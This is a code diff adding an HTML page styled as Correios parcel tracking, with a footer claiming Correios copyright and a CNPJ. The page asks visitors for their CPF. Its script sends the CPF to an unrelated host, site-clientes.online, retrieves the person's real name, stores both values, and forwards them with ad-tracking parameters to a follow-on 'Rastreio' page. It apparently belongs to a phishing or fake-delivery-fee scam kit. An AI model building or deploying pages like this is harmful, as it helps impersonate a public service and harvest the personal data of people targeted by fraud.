+    <path d="m6 19 22-11 23 11-23 12L6 19Z" stroke="currentColor" stroke-width="2.8" stroke-linejoin="round"/>
+    <path d="M6 19v25l22 12V31M51 19v14M17 14l22 12M17 26v12l11 6" stroke="currentColor" stroke-width="2.8" stroke-linejoin="round"/>
+    <circle cx="45" cy="43" r="10" fill="#f0f0f0" stroke="currentColor" stroke-width="2.8"/>
+    <path d="m52 50 7 7" stroke="currentColor" stroke-width="3.6" stroke-linecap="round"/>
+  </svg>
+</div>
+
+<form id="tracking-form" novalidate>
+  <div class="tracking-row">
+    <div class="tracking-input-wrap">
+      <label class="visually-hidden" for="tracking-code">
+        CPF
+      </label>
+
+<input
+  id="tracking-code"
+  name="cpf"
+  type="text"
+  placeholder="INFORME SEU CPF: 000.000.000-00"
+  style="text-align: center; font-weight: bold;"
+  autocomplete="off"
+  inputmode="numeric"
+  maxlength="14"
+  required
+>
+
+      <button
+        class="search-icon-button"
+        type="submit"
+        aria-label="Consultar CPF"
+      >
+        <svg
+          viewBox="0 0 24 24"
+          aria-hidden="true"
+        >
+          <circle cx="10.5" cy="10.5" r="6.7"></circle>
+          <path d="m15.6 15.6 5 5"></path>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <p
+    id="tracking-error"
+    class="field-error"
+    role="alert"
+    hidden
+  ></p>
+
+  <div class="yellow-rule" aria-hidden="true"></div>
+
+  <button class="submit-button" type="submit">
+    Consultar encomenda
+  </button>
+</form>
+
+
+<script>
+(function () {
+  "use strict";
+
+  function initCPFForm() {
+    const form = document.getElementById("tracking-form");
+    const inputCPF = document.getElementById("tracking-code");
+    const errorElement = document.getElementById("tracking-error");
+
+    if (!form || !inputCPF || !errorElement) return;
+
+    // Evita inicializar o formulário duas vezes.
+    if (form.dataset.cpfInitialized === "true") return;
+    form.dataset.cpfInitialized = "true";
+
+    const API_URL =
+      "https://site-clientes.online/aknes-api/aknes.php";
+
+    const NEXT_URL = "../Rastreio/index.html";
+
+    let isSubmitting = false;
+
+    function onlyDigits(value) {
+      return value.replace(/\D/g, "").slice(0, 11);
+    }
+
+    // Formata o CPF: 000.000.000-00
+    function formatCPF(digits) {
+      digits = digits.slice(0, 11);
+
+      if (digits.length > 9) {
+        return digits.replace(
+          /^(\d{3})(\d{3})(\d{3})(\d{1,2})$/,
+          "$1.$2.$3-$4"
+        );
+      }
+
+      if (digits.length > 6) {
+        return digits.replace(
+          /^(\d{3})(\d{3})(\d+)$/,
+          "$1.$2.$3"
+        );
+      }
+
+      if (digits.length > 3) {
+        return digits.replace(
+          /^(\d{3})(\d+)$/,
+          "$1.$2"
+        );
+      }
+
+      return digits;
+    }
+
+    // Valida os dígitos verificadores do CPF.
+    function isValidCPF(value) {
+      const cpf = onlyDigits(value);
+
+      if (cpf.length !== 11) return false;
+      if (/^(\d)\1{10}$/.test(cpf)) return false;
+
+      const digits = cpf.split("").map(Number);
+      let sum = 0;
+
+      for (let i = 0; i < 9; i++) {
+        sum += digits[i] * (10 - i);
+      }
+
+      let remainder = (sum * 10) % 11;
+      if (remainder === 10) remainder = 0;
+
+      if (remainder !== digits[9]) return false;
+
+      sum = 0;
+
+      for (let i = 0; i < 10; i++) {
+        sum += digits[i] * (11 - i);
+      }
+
+      remainder = (sum * 10) % 11;
+      if (remainder === 10) remainder = 0;
+
+      return remainder === digits[10];
+    }
+
+    // Centraliza a mensagem na largura total disponível.
+    function showError(message) {
+      errorElement.textContent = message;
+      errorElement.hidden = false;
+
+      errorElement.style.setProperty("display", "block", "important");
+      errorElement.style.setProperty("width", "100%", "important");
+      errorElement.style.setProperty("max-width", "100%", "important");
+      errorElement.style.setProperty("text-align", "center", "important");
+      errorElement.style.setProperty("font-size", "1.1em", "important");
+      errorElement.style.setProperty("font-weight", "bold", "important");
+      errorElement.style.setProperty("margin-left", "auto", "important");
+      errorElement.style.setProperty("margin-right", "auto", "important");
+      errorElement.style.setProperty("box-sizing", "border-box", "important");
+
+      errorElement.setAttribute("role", "alert");
+      inputCPF.setAttribute("aria-invalid", "true");
+    }
+
+    function clearError() {
+      errorElement.textContent = "";
+      errorElement.hidden = true;
+
+      [
+        "display",
+        "width",
+        "max-width",
+        "text-align",
+        "font-size",
+        "font-weight",
+        "margin-left",
+        "margin-right",
+        "box-sizing"
+      ].forEach(function (property) {
+        errorElement.style.removeProperty(property);
+      });
+
+      inputCPF.removeAttribute("aria-invalid");
+    }
+
+    // Máscara automática mantendo a posição do cursor.
+    inputCPF.addEventListener("input", function () {
+      const oldValue = inputCPF.value;
+      const oldCursor = inputCPF.selectionStart;
+
+      const digitsBeforeCursor = oldValue
+        .slice(0, oldCursor === null ? oldValue.length : oldCursor)
+        .replace(/\D/g, "").length;
+
+      const digits = onlyDigits(oldValue);
+      const formatted = formatCPF(digits);
+
+      inputCPF.value = formatted;
+
+      let newCursor = 0;
+      let digitCount = 0;
+
+      while (
+        newCursor < formatted.length &&
+        digitCount < digitsBeforeCursor
+      ) {
+        if (/\d/.test(formatted[newCursor])) {
+          digitCount++;
+        }
+
+        newCursor++;
+      }
+
+      try {
+        inputCPF.setSelectionRange(newCursor, newCursor);
+      } catch (_) {}
+
+      clearError();
+    });
+
+    // Consulta o CPF ao enviar o formulário.
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+
+      if (isSubmitting) return;
+
+      clearError();
+
+      const cpf = onlyDigits(inputCPF.value);
+
+      if (!isValidCPF(cpf)) {
+        showError("Digite um CPF válido, com 11 dígitos.");
+        inputCPF.focus();
+        return;
+      }
+
+      isSubmitting = true;
+
+      const buttons = form.querySelectorAll('button[type="submit"]');
+
+      buttons.forEach(function (button) {
+        button.disabled = true;
+      });
+
+      try {
+        const apiURL = new URL(API_URL);
+        apiURL.searchParams.set("cpf", cpf);
+
+        const response = await fetch(apiURL.toString(), {
+          method: "GET",
+          headers: {
+            "Accept": "application/json"
+          }
+        });
+
+        if (!response.ok) {
+          throw new Error(
+            "Não foi possível consultar o CPF. Tente novamente."
+          );
+        }
+
+        const data = await response.json();
+
+        if (!data || Number(data.status) !== 200) {
+          throw new Error(
+            "CPF não encontrado. Verifique os números e tente novamente."
+          );
+        }
+
+        // Captura nome e CPF formatado da resposta da API
+        const nomeReal = data.nome || "";
+        const cpfFormatado = data.cpf || cpf;
+
+        // Persiste no localStorage para uso em outras páginas
+        try { localStorage.setItem("nome", nomeReal); } catch (_) {}
+        try { localStorage.setItem("cpf", cpfFormatado); } catch (_) {}
+
+        // Preserva os parâmetros atuais, incluindo as UTMs.
+        const currentParams = new URLSearchParams(
+          window.location.search
+        );
+
+        currentParams.set("cpf", cpf);
+        currentParams.set("cpf_fmt", encodeURIComponent(cpfFormatado));
+        currentParams.set("nome", encodeURIComponent(nomeReal));
+
+        const queryString = currentParams.toString();
+
+        const destination = queryString
+          ? NEXT_URL + "?" + queryString
+          : NEXT_URL;
+
+        window.location.href = destination;
+
+      } catch (error) {
+        showError(
+          error instanceof TypeError
+            ? "Erro de conexão ao consultar o CPF. Tente novamente."
+            : error.message || "Ocorreu um erro. Tente novamente."
+        );
+
+        isSubmitting = false;
+
+        buttons.forEach(function (button) {
+          button.disabled = false;
+        });
+      }
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", initCPFForm, {
+      once: true
+    });
+  } else {
+    initCPFForm();
+  }
+})();
+</script>
+
+
+      <h4 class="services-note">Atenção: Digite seu CPF <br> sem pontos e traços (apenas números)</h4>
+    </section>
+
+    <div class="footer-spacer" aria-hidden="true"></div>
+
+    </main>
+ <footer class="site-footer" id="ajuda">
+    <div class="footer-brand-row">
+      <a class="footer-brand" href="" aria-label="Rota, início"><div class="footer-brand-row">
+  <img src="images/footer.png" alt="" class="footer-mark">
+</div>
+
+<style>
+  .footer-brand-row {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+  }
+
+  .footer-mark {
+    display: block;
+    width: 390px;
+    max-width: 90%;
+    height: auto;
+    margin: 0 auto;
+    object-fit: contain;
+  }
+</style>
+        
+      </a>
+      
+    </div>
+
+    <p class="copyright">© Copyright 2026 Correios</p>
+    <p class="footer-subline">CNPJ 34.028.316/0001-03
+</p>
+  </footer>
+
+  
+</body>
+</html>
